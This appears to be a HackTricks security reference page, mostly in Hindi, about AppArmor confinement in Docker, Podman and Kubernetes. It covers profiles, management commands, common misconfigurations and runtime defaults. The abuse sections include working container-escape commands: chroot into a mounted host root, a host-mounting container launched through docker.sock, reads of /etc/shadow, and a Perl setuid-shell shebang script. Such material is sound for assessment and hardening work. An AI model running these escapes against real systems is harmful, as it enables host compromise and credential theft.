# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

AppArmor एक **Mandatory Access Control** सिस्टम है जो प्रति-प्रोग्राम profiles के माध्यम से प्रतिबंध लागू करता है। पारंपरिक DAC जांचों के विपरीत, जो user और group ownership पर भारी निर्भर करती हैं, AppArmor kernel को उस policy को लागू करने देता है जो process के साथ जुड़ी होती है। container परिवेशों में यह इसलिए महत्वपूर्ण है क्योंकि एक workload के पास पारंपरिक रूप से किसी क्रिया को करने के लिए पर्याप्त privilege हो सकते हैं और फिर भी उसे रोका जा सकता है क्योंकि उसका AppArmor profile संबंधित path, mount, network व्यवहार, या capability उपयोग की अनुमति नहीं देता।

सबसे महत्वपूर्ण अवधारणात्मक बिंदु यह है कि AppArmor **path-based** है। यह filesystem एक्सेस को path नियमों के आधार पर तर्क करता है न कि SELinux की तरह labels के माध्यम से। इससे यह समझने में आसान और शक्तिशाली बनता है, लेकिन इसका मतलब यह भी है कि bind mounts और वैकल्पिक path लेआउट्स को सावधानी से देखा जाना चाहिए। यदि वही host सामग्री किसी अलग path के तहत पहुँच योग्य हो जाती है, तो policy का प्रभाव उस तरह नहीं हो सकता जैसा operator ने पहली बार सोचा था।

## Role In Container Isolation

Container security reviews अक्सर capabilities और seccomp पर रुक जाती हैं, लेकिन AppArmor उन जांचों के बाद भी मायने रखता है। कल्पना करें कि एक container के पास जितनी अनुमति होनी चाहिए उससे ज्यादा privilege हैं, या किसी workload को ऑपरेशनल कारणों से एक अतिरिक्त capability चाहिए थी। AppArmor फिर भी file access, mount व्यवहार, networking और execution पैटर्न को ऐसे तरीके से प्रतिबंधित कर सकता है जो स्पष्ट दुरुपयोग मार्ग को रोक दें। इसलिए AppArmor को "just to get the application working" के लिए disable करना चुपचाप केवल जोखिम भरे कॉन्फ़िगरेशन को सक्रिय रूप से exploitable में बदल सकता है।

## Lab

यह जांचने के लिए कि AppArmor host पर active है या नहीं, उपयोग करें:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
यह देखने के लिए कि वर्तमान container process किसके तहत चल रहा है:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
यह अंतर शिक्षाप्रद है। सामान्य स्थिति में, प्रोसेस में AppArmor context दिखना चाहिए जो runtime द्वारा चुने गए profile से जुड़ा होता है। unconfined स्थिति में, वह अतिरिक्त restriction layer गायब हो जाता है।

आप यह भी जांच सकते हैं कि Docker ने क्या लागू किया है:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker होस्ट AppArmor को सपोर्ट करे तो डिफ़ॉल्ट या कस्टम AppArmor प्रोफ़ाइल लागू कर सकता है। Podman भी AppArmor-based systems पर AppArmor के साथ इंटीग्रेट कर सकता है, हालांकि SELinux-first distributions पर दूसरा MAC सिस्टम अक्सर प्रमुख भूमिका निभाता है। Kubernetes उन नोड्स पर जहाँ AppArmor सचमुच सपोर्ट होता है, workload स्तर पर AppArmor नीति एक्सपोज़ कर सकता है। LXC और संबंधित Ubuntu-family system-container वातावरण भी व्यापक रूप से AppArmor का उपयोग करते हैं।

व्यावहारिक बात यह है कि AppArmor कोई "Docker feature" नहीं है। यह एक host-kernel feature है जिसे कई runtimes लागू कर सकते हैं। अगर होस्ट इसे सपोर्ट नहीं करता या runtime को run unconfined करने के लिए कहा गया है, तो कथित सुरक्षा असल में मौजूद नहीं होती।

Docker-capable AppArmor होस्ट्स पर सबसे प्रसिद्ध डिफ़ॉल्ट `docker-default` है। वह प्रोफ़ाइल Moby's AppArmor template से जनरेट होती है और महत्वपूर्ण है क्योंकि यह समझाती है कि क्यों कुछ capability-based PoCs अभी भी एक डिफ़ॉल्ट container में फेल होते हैं। सामान्य तौर पर, `docker-default` सामान्य networking की अनुमति देता है, `/proc` के बड़े हिस्सों में writes को अस्वीकार करता है, `/sys` के संवेदनशील हिस्सों तक एक्सेस को रोकता है, mount operations को ब्लॉक करता है, और ptrace को सीमित करता है ताकि वह सामान्य host-probing primitive न बन सके। उस बेसलाइन को समझना यह अलग पहचानने में मदद करता है कि "the container has `CAP_SYS_ADMIN`" और "the container can actually use that capability against the kernel interfaces I care about" में क्या फर्क है।

## प्रोफ़ाइल प्रबंधन

AppArmor प्रोफ़ाइल आमतौर पर `/etc/apparmor.d/` के तहत स्टोर होती हैं। एक सामान्य नामकरण कन्वेंशन यह है कि executable path के slashes को dots से बदल दिया जाता है। उदाहरण के लिए, `/usr/bin/man` के लिए प्रोफ़ाइल अक्सर `/etc/apparmor.d/usr.bin.man` के रूप में स्टोर होती है। यह विवरण रक्षा और आकलन दोनों के दौरान मायने रखता है क्योंकि एक बार आप सक्रिय प्रोफ़ाइल नाम जान लें, आप अक्सर संबंधित फ़ाइल को होस्ट पर जल्दी से ढूँढ सकते हैं।

उपयोगी host-side मैनेजमेंट कमांड्स में शामिल हैं:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
The reason these commands matter in a container-security reference is that they explain how profiles are actually built, loaded, switched to complain mode, and modified after application changes. If an operator has a habit of moving profiles into complain mode during troubleshooting and forgetting to restore enforcement, the container may look protected in documentation while behaving much more loosely in reality.

### प्रोफाइल्स बनाना और अपडेट करना

`aa-genprof` application के व्यवहार का निरीक्षण कर सकता है और interactive रूप से एक profile generate करने में मदद कर सकता है:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` एक टेम्पलेट प्रोफ़ाइल जनरेट कर सकता है जिसे बाद में `apparmor_parser` के साथ लोड किया जा सकता है:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
जब बाइनरी बदलती है और पॉलिसी को अपडेट करने की जरूरत होती है, `aa-logprof` logs में पाए गए denials को replay कर सकता है और ऑपरेटर को यह निर्णय लेने में मदद करता है कि उन्हें allow करना है या deny करना है:
```bash
sudo aa-logprof
```
### लॉग्स

AppArmor अस्वीकृतियाँ अक्सर `auditd`, syslog, या `aa-notify` जैसे टूल्स के माध्यम से दिखाई देती हैं:
```bash
sudo aa-notify -s 1 -v
```
यह संचालन और आक्रामक दोनों ही दृष्टियों से उपयोगी है। रक्षात्मक पक्ष इसे प्रोफ़ाइलों को परिष्कृत करने के लिए उपयोग करते हैं। आक्रमणकारी इसका उपयोग यह पता लगाने के लिए करते हैं कि किस सटीक पथ या ऑपरेशन को नकारा जा रहा है और क्या AppArmor किसी exploit chain को ब्लॉक कर रहा नियंत्रण है।

### सटीक प्रोफ़ाइल फ़ाइल की पहचान

जब किसी runtime में किसी container के लिए एक विशिष्ट AppArmor प्रोफ़ाइल नाम दिखता है, तो अक्सर उस नाम को डिस्क पर स्थित प्रोफ़ाइल फ़ाइल से मैप करना उपयोगी होता है:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
यह विशेष रूप से host-side समीक्षा के दौरान उपयोगी होता है क्योंकि यह "the container says it is running under profile `lowpriv`" और "the actual rules live in this specific file that can be audited or reloaded" के बीच की खाई को पाटता है।

## गलत कॉन्फ़िगरेशन

सबसे स्पष्ट गलती `apparmor=unconfined` है। प्रशासक अक्सर इसे उस समय सेट कर देते हैं जब वे किसी application को डिबग कर रहे होते हैं जो इसलिए फेल हुआ क्योंकि profile ने सही तरीके से किसी खतरनाक या अनपेक्षित चीज़ को ब्लॉक कर दिया था। यदि यह फ्लैग production में रह जाता है, तो पूरी MAC लेयर प्रभावी रूप से हटा दी गई होती है।

एक और सूक्ष्म समस्या यह मान लेना है कि bind mounts हानिरहित हैं क्योंकि फ़ाइल अनुमतियाँ सामान्य दिखती हैं। क्योंकि AppArmor path-based है, alternate mount locations के तहत host paths को एक्सपोज़ करने से path नियमों के साथ खराब इंटरैक्शन हो सकता है। तीसरी गलती यह भूलना है कि config file में profile नाम का मतलब बहुत कम होता है अगर host kernel वास्तव में AppArmor को लागू नहीं कर रहा है।

## दुरुपयोग

जब AppArmor मौजूद नहीं रहता, तो वे ऑपरेशन्स जो पहले constrained थे अचानक काम करने लगते हैं: bind mounts के माध्यम से संवेदनशील paths पढ़ना, procfs या sysfs के उन हिस्सों तक पहुँच जो उपयोग में रखना कठिन रहना चाहिए था, mount-related actions करना अगर capabilities/seccomp भी अनुमति देते हैं, या ऐसे paths का उपयोग करना जिन्हें एक profile सामान्यतः deny कर देता। AppArmor अक्सर वह तंत्र होता है जो समझाता है कि क्यों capability-based breakout प्रयास कागज पर "should work" दिखता है पर व्यवहार में विफल रहता है। AppArmor हटा दें, और वही प्रयास सफल होना शुरू हो सकता है।

यदि आपको शक है कि AppArmor किसी path-traversal, bind-mount, या mount-based abuse chain को रोकने वाली मुख्य चीज है, तो पहला कदम आमतौर पर यह तुलना करना है कि profile के साथ और बिना क्या accessible होता है। उदाहरण के लिए, यदि कोई host path container के अंदर mount है, तो शुरू करें यह चेक करके कि क्या आप उसे traverse और पढ़ सकते हैं:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
यदि container में भी `CAP_SYS_ADMIN` जैसी खतरनाक capability मौजूद है, तो सबसे व्यावहारिक परीक्षणों में से एक यह है कि AppArmor ही mount operations या संवेदनशील kernel filesystems तक पहुँच को रोकने वाला नियंत्रण है या नहीं:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
ऐसे वातावरणों में जहाँ host path पहले से ही bind mount के माध्यम से उपलब्ध है, AppArmor खोने पर एक read-only information-disclosure issue सीधे host file access में बदल सकती है:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
इन कमांड्स का मकसद यह नहीं है कि AppArmor अकेले breakout बनाता है। मकसद यह है कि एक बार AppArmor हट जाने पर, कई filesystem और mount-based abuse paths तुरंत परीक्षण योग्य हो जाते हैं।

### पूर्ण उदाहरण: AppArmor Disabled + Host Root Mounted

यदि container में पहले से host root bind-mounted होकर `/host` पर है, तो AppArmor हटाने से एक blocked filesystem abuse path पूर्ण host escape में बदल सकता है:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
एक बार जब shell host filesystem के माध्यम से चल रहा होता है, तो workload प्रभावी रूप से container boundary से बाहर निकल चुका होता है:
```bash
id
hostname
cat /etc/shadow | head
```
### पूर्ण उदाहरण: AppArmor Disabled + Runtime Socket

यदि वास्तविक बाधा AppArmor द्वारा runtime state के आसपास थी, तो एक mounted socket एक complete escape के लिए पर्याप्त हो सकता है:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
सटीक पथ माउंट प्वाइंट पर निर्भर करता है, लेकिन परिणाम वही रहता है: AppArmor अब runtime API तक पहुँच को रोक नहीं रहा है, और runtime API एक host-compromising container लॉन्च कर सकता है।

### पूर्ण उदाहरण: Path-Based Bind-Mount Bypass

क्योंकि AppArmor path-based है, `/proc/**` की सुरक्षा अपने आप उसी host procfs सामग्री की रक्षा नहीं करती जब वह किसी अलग पथ के माध्यम से पहुँचने योग्य हो:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
प्रभाव इस बात पर निर्भर करता है कि वास्तव में क्या माउंट किया गया है और क्या वैकल्पिक पथ अन्य नियंत्रणों को भी बायपास करता है या नहीं, लेकिन यह पैटर्न उन सबसे स्पष्ट कारणों में से एक है जिनकी वजह से AppArmor को अकेले नहीं बल्कि mount layout के साथ मिलाकर आकलित किया जाना चाहिए।

### पूर्ण उदाहरण: Shebang Bypass

AppArmor नीति कभी-कभी interpreter path को इस तरह लक्षित करती है कि वह shebang हैंडलिंग के जरिए स्क्रिप्ट निष्पादन को पूरी तरह से ध्यान में नहीं रखती। एक ऐतिहासिक उदाहरण में एक स्क्रिप्ट का उपयोग शामिल था जिसकी पहली पंक्ति एक confined interpreter की ओर इशारा करती थी:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
यह प्रकार का उदाहरण यह याद दिलाने के लिए महत्वपूर्ण है कि profile intent और actual execution semantics अलग हो सकते हैं। जब container environments में AppArmor की समीक्षा की जा रही हो, तो interpreter chains और alternate execution paths को विशेष ध्यान देने की आवश्यकता होती है।

## जाँच

इन जाँचों का उद्देश्य तीन सवालों का जल्दी उत्तर देना है: क्या AppArmor host पर enabled है, क्या current process confined है, और क्या runtime ने वास्तव में इस container पर कोई profile apply किया?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the workload AppArmor confinement से लाभान्वित नहीं हो रहा है.
- If `aa-status` shows AppArmor disabled or not loaded, runtime config में कोई भी profile name ज्यादातर cosmetic होता है.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, तो अक्सर वही वजह होती है जिससे filesystem या mount-based abuse path काम कर पाता है.

If a container already has elevated privileges for operational reasons, AppArmor enabled छोड़ने से अक्सर controlled exception और एक बहुत बड़े security failure के बीच फर्क पड़ता है.

## रनटाइम डिफ़ॉल्ट

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

AppArmor के लिए सबसे महत्वपूर्ण चैर अक्सर **होस्ट** होता है, न कि सिर्फ़ runtime. किसी manifest में profile setting उस node पर confinement नहीं बनाती जहाँ AppArmor सक्षम नहीं है.
{{#include ../../../../banners/hacktricks-training.md}}
